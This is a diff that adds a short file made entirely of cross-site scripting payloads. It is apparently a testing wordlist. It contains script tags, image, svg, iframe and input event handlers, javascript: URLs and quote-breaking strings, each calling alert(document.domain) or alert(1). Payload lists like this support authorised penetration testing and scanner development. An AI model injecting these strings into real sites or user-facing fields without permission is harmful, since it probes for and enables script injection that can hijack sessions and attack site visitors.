@@ -1,0 +1,30 @@
+<script>alert(document.domain)</script>
+<script>alert(1)</script>
+"><script>alert(document.domain)</script>
+"><script>alert(1)</script>
+'><script>alert(document.domain)</script>
+</script><script>alert(document.domain)</script>
+"><img src=x onerror=alert(document.domain)>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+"><svg onload=alert(document.domain)>
+'><svg onload=alert(document.domain)>
+<iframe src=javascript:alert(document.domain)>
+"><iframe src=javascript:alert(document.domain)>
+<body onload=alert(document.domain)>
+"><body onload=alert(document.domain)>
+<input autofocus onfocus=alert(document.domain)>
+"><input autofocus onfocus=alert(document.domain)>
+<select autofocus onfocus=alert(document.domain)>
+<textarea autofocus onfocus=alert(document.domain)>
+<details open ontoggle=alert(document.domain)>
+"><details open ontoggle=alert(document.domain)>
+<marquee onstart=alert(document.domain)>
+<video><source onerror=alert(document.domain)>
+<audio src=x onerror=alert(document.domain)>
+"><a href=javascript:alert(document.domain)>click
+javascript:alert(document.domain)
+'-alert(document.domain)-'
+";alert(document.domain);//
+';alert(document.domain);//
